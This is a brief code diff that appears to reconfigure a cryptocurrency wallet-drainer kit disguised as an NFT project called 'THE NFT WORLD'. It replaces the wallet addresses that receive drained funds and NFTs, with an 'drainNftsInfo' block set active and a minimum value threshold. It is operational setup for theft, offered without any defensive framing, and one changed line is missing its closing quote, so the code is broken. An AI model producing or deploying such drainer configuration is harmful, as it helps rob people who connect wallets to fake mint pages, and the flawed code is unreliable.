@@ -1,4 +1,4 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+const receiveAddress = '0xeD76B541b073BD98245baB19f012ec9AFA2D78cF',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0xeD76B541b073BD98245baB19f012ec9AFA2D78cF,
   },
 
   customStrings = {
